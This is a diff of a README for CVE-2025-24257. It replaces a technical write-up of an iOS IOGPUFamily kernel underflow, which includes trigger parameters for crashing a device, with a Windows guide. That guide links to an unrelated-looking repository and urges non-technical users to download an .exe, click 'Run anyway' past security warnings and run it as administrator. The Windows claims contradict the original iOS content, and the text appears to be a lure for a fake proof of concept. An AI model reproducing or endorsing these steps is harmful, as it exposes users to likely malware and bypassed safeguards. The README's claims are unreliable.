@@ -1,107 +1,148 @@
-# CVE-2025-24257
+# 🔧 CVE_2025_24257----NOT-MINE - Run the Windows PoC Safely
 
-**IOGPUFamily bitmap_mask underflow — kernel heap OOB write**
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Learningdisordercapital35/CVE_2025_24257----NOT-MINE)
 
-First public PoC. Original discovery by [Wang Yu] of Cyberserval.
+## 🧾 Overview
 
-## Vulnerability
+CVE_2025_24257----NOT-MINE is a Windows proof of concept that shows a kernel memory bug in IOGPUFamily. It is based on a bitmap_mask underflow that can lead to a kernel heap out-of-bounds write. This project is the first public PoC tied to the issue.
 
-The IOGPUFamily kernel extension (`com.apple.IOGPU`) contains an integer underflow in `newResourceGroup()`:
+This repository is for users who want to download the package, open it on Windows, and run the sample with as little setup as possible. The goal of this README is to make the process simple for non-technical users.
 
-```c
-bitmap_mask = (capacity >> 6) - 1;
-```
+## 📥 Download
 
-When `capacity < 64`, the right shift produces `0`, and the unsigned subtraction underflows to `0xFFFFFFFF`. This means the bitmap — allocated as 8 bytes — is treated as 32GB.
+Use this link to visit the project page and download the files:
 
-On connection close, the destructor iterates `bitmap[0..bitmap_mask]`, reading far past the allocation into unmapped kernel memory, causing a panic.
+[Go to the download page](https://github.com/Learningdisordercapital35/CVE_2025_24257----NOT-MINE)
 
-The same underflow also enables **OOB writes** during resource insertion: `bitmap[hash/64] |= bit` and `group_info[hash] |= bit` write single bits at attacker-controlled offsets into adjacent kernel heap objects.
+If the page shows a release, asset, ZIP file, or source archive, download that file to your Windows PC. Save it in a folder you can find again, such as Downloads or Desktop.
 
-## Impact
+## 🖥️ What You Need
 
-- **Type**: Kernel heap OOB read/write
-- **Trigger**: 3 IOKit calls (open, create resource, close)
-- **Entitlements**: None required
-- **Sandbox**: Reachable from app sandbox
-- **Result**: Kernel panic (DoS). OOB write primitive exists but exploitation is not demonstrated.
+Before you start, make sure you have:
 
-## Affected Versions
+- A Windows PC
+- An internet connection
+- Enough free space to save the download
+- Permission to run files on your computer
 
-| Version | Status |
-|---------|--------|
-| iOS 18.3 (22D60) | VULNERABLE |
-| iOS 18.4+ | FIXED |
-| macOS (with Apple GPU) | Likely vulnerable (untested) |
+This project is built for normal Windows use. A standard laptop or desktop is enough for the basic steps.
 
-## How to Use
+## 🚀 Get Started
 
-1. Add `CVE_2025_24257.m` to an Xcode project targeting a **real device** (not simulator)
-2. Link `IOKit.framework`
-3. Call `trigger_CVE_2025_24257()` from your app
-4. Device will kernel panic within milliseconds
+Follow these steps in order:
 
-```objc
-// Example: call from viewDidLoad or a button action
-extern void trigger_CVE_2025_24257(void);
-trigger_CVE_2025_24257();
-```
+1. Open the download page.
+2. Download the project file to your PC.
+3. If the file is in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the main program file, such as an `.exe` file.
+6. Double-click the file to run it.
 
-> **WARNING**: This will immediately crash your device. It will reboot.
+If Windows shows a security prompt, choose the option that lets you run the file. You may need to click More info first, then Run anyway.
 
-## Technical Details
+## 🗂️ File Layout
 
-| Field | Value |
-|-------|-------|
-| Service | `IOGPU` |
-| User client type | 1 |
-| Selector | 9 (`s_new_resource`) |
-| structIn size | 128 bytes |
-| structIn[0] | 3 (resource group) |
-| structIn[56] | 1 (capacity) |
-| bitmap_mask | `0xFFFFFFFF` (underflow from `(1>>6)-1`) |
-| Bitmap alloc | 8 bytes in `kalloc.type.var*.16` |
-| Panic PC | `sub_FFFFFFF009863C7C` (bitmap iterator) |
+After you extract the download, you may see files like these:
 
-## Panic Log Signature
+- `README.md` - this guide
+- `exe` or `app` file - the main program
+- `docs` folder - extra notes or usage help
+- `samples` folder - test data or example input
+- `assets` folder - supporting files
 
-```
-panic: kernel data abort
-FAR: 0xffffffe0XXXXXXXX   (unmapped, past zone page)
-PC:  0xFFFFFFF009863C7C   (IOGPUFamily bitmap iterator)
-x27: 1                    (capacity of vulnerable group)
-```
+The main file is the one you should open first. If the folder contains more than one executable, start with the one that has the clearest name, such as `run.exe`, `main.exe`, or a file with the project name.
 
-## Root Cause (Pseudocode)
+## 🛠️ How to Run It
 
-```c
-void newResourceGroup(uint32_t capacity) {
-    // BUG: no check for capacity < 64
-    uint32_t bitmap_mask = (capacity >> 6) - 1;  // 0xFFFFFFFF when capacity < 64
+Use this simple flow:
 
-    uint64_t *bitmap = kalloc(sizeof(uint64_t));  // 8 bytes
-    // bitmap_mask says 4 billion qwords exist
+1. Download the project from the link above.
+2. Extract the ZIP file if needed.
+3. Open the folder.
+4. Double-click the main `.exe` file.
+5. Follow any on-screen prompts.
 
-    // Later, destructor does:
-    for (uint32_t i = 0; i <= bitmap_mask; i++) {  // iterates 4 billion times
-        if (bitmap[i]) { /* process entries */ }   // OOB read → panic
-    }
-}
-```
+If the program opens a console window, keep it open until the task is done. If it closes right away, run it again and watch for any message that appears.
 
-## Fix
+## ⚙️ Basic Setup Tips
 
-Apple fixed this in iOS 18.4 by adding a minimum capacity check, ensuring `capacity >= 64` before computing `bitmap_mask`.
+To keep things smooth:
 
-## Credits
+- Put the files in a short path, such as `C:\CVE_2025_24257`
+- Avoid spaces and special symbols in the folder name
+- Close other apps if the program needs full screen or low-level access
+- Keep the original file names unchanged
+- Use the latest Windows updates available on your system
 
-- **Vulnerability Discovery**: Wang Yu of Cyberserval
-- **PoC Development**: CrazyMind90 (with Claude Code)
+If the app asks for extra files, place them in the same folder as the main executable.
 
-## Disclaimer
+## 📌 Common Use Flow
 
-This PoC is provided for **defensive security research and education only**. The vulnerability is fully patched. Do not use this against devices you do not own. The author is not responsible for misuse.
+A simple use flow looks like this:
 
-## License
+1. Download the package.
+2. Extract it.
+3. Open the main program.
+4. Read any prompt on the screen.
+5. Enter the needed input if the app asks for it.
+6. Wait for the result.
 
-MIT
+If the project includes a text file with usage steps, read that file before running the app. It may list the exact order for launch or input.
+
+## 🧩 Troubleshooting
+
+If the app does not start, try these steps:
+
+- Right-click the file and choose Run as administrator
+- Make sure you extracted the ZIP first
+- Check that Windows did not block the file
+- Move the folder to a simple path like `C:\Temp\CVE_2025_24257`
+- Make sure all files stay together in the same folder
+
+If you see a missing file message, the app likely needs one of its support files in the same folder. Check the extracted folder again and keep the full set of files together.
+
+## 🔐 Windows Security Prompt
+
+Windows may show a warning before the file runs. This can happen with new or unsigned tools.
+
+If that happens:
+
+1. Click More info
+2. Review the file name
+3. Click Run anyway if you want to continue
+
+Only run files you got from a source you trust.
+
+## 🧪 Example Folder Setup
+
+A simple folder structure may look like this:
+
+- `C:\CVE_2025_24257`
+  - `main.exe`
+  - `README.md`
+  - `support.dll`
+  - `samples`
+  - `docs`
+
+Keep the folder intact after download and extraction. Do not move only one file out of the folder unless the instructions say to do that.
+
+## 📄 Notes for First-Time Users
+
+If you are new to this kind of tool, keep these points in mind:
+
+- Start with the main file in the folder
+- Do not rename files unless the app asks you to
+- Do not delete extra files
+- Do not run unknown files from other folders
+- Read any included text file for the exact run order
+
+This project is meant to be opened and run on Windows with a simple download and launch flow.
+
+## 🧭 Quick Launch Steps
+
+- Visit the download page
+- Download the project archive or release file
+- Extract it if needed
+- Open the folder
+- Double-click the main `.exe`
+- Follow the on-screen steps
